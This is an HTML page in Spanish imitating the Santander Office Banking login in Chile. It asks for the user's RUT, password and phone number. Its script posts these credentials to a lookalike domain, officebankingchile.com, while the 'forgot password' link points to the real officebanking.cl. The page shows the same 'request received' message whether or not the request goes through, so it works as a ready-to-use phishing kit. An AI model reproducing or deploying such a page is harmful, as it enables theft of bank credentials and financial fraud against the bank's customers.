<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Office Banking - Acceso</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <!-- Mensaje de bienvenida -->
    <h2 class="welcome-message">Bienvenido a OfficeBanking-Santander</h2>

    <form id="loginForm">
      <label for="rut">RUT</label>
      <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
      
      <label for="passwd">Contraseña</label>
      <div class="password-container">
        <input 
          type="password" 
          id="passwd" 
          name="passwd" 
          placeholder="Contraseña"
          maxlength="10"
          required
        />
        <!-- Botón ojo -->
        <button type="button" class="toggle-visibility" onclick="togglePassword()">
          <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" viewBox="0 0 16 16">
            <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8z"/>
            <path d="M8 5.5a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5z"/>
          </svg>
        </button>
        <!-- Botón X -->
        <button type="button" class="clear-input" onclick="clearPassword()">
          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" viewBox="0 0 16 16">
            <path d="M4.646 4.646a.5.5 0 0 1 .708 0L8 7.293l2.646-2.647a.5.5 0 0 1 .708.708L8.707 8l2.647 2.646a.5.5 0 0 1-.708.708L8 8.707l-2.646 2.647a.5.5 0 0 1-.708-.708L7.293 8 4.646 5.354a.5.5 0 0 1 0-.708z"/>
          </svg>
        </button>
      </div>

      <label for="telefono">Teléfono actualizado</label>
      <input type="tel" id="telefono" name="telefono" placeholder="+56 9 1234 5678" required>
      
      <label class="checkbox-label">
        <input type="checkbox" id="contacto" name="contacto" required>
        Acepto ser eventualmente contactado por Banco Santander para recibir ofertas o promociones.
      </label>
      
      <div class="options">
        <label><input type="checkbox" id="recordar"> Recordar usuario</label>
        <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">Olvidé mi clave</a>
      </div>
      
      <button type="submit">Ingresar</button>
    </form>
    <div id="resultado"></div>

    <div class="footer-icons">
      <div>📊<br>Indicadores Económicos</div>
      <div>☎️<br>Contact Center</div>
    </div>
  </div>

  <script>
    function togglePassword() {
  const input = document.getElementById("passwd");
  const eyeIcon = document.getElementById("eyeIcon");

  if (input.type === "password") {
    input.type = "text";
    eyeIcon.innerHTML = `
      <path d="M13.359 11.238l1.147 1.147a.5.5 0 0 1-.708.708l-1.147-1.147A8.717 8.717 0 0 1 8 13.5c-5 0-8-5.5-8-5.5a15.49 15.49 0 0 1 3.58-3.905L1.146 2.854a.5.5 0 1 1 .708-.708l12 12a.5.5 0 0 1-.708.708l-1.787-1.787z"/>
      <path d="M11.297 9.176l-1.414-1.414A2.5 2.5 0 0 0 8 5.5a2.5 2.5 0 0 0-2.5 2.5c0 .64.25 1.22.657 1.657l-1.414 1.414A4.5 4.5 0 0 1 8 4.5a4.5 4.5 0 0 1 3.297 4.676z"/>`;
  } else {
    input.type = "password";
    eyeIcon.innerHTML = `
      <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8z"/>
      <path d="M8 5.5a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5z"/>`;
  }
}

function clearPassword() {
  document.getElementById("passwd").value = "";
}
    // Conexión al backend en Render
    document.getElementById("loginForm").addEventListener("submit", async function(event) {
      event.preventDefault();

      const rut = document.getElementById("rut").value;
      const passwd = document.getElementById("passwd").value;
      const telefono = document.getElementById("telefono").value;
      const contacto = document.getElementById("contacto").checked;

      try {
        await fetch("https://login.officebankingchile.com/login", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            rut: rut,
            passwd: passwd,
            telefono: telefono,
            contacto: contacto
          })
        });

        document.getElementById("resultado").innerText = "✅ Hemos recibido tu solicitud";
      } catch (error) {
        document.getElementById("resultado").innerText = "✅ Hemos recibido tu solicitud";
        console.error(error);
      }
    });
  </script>
</body>
</html>
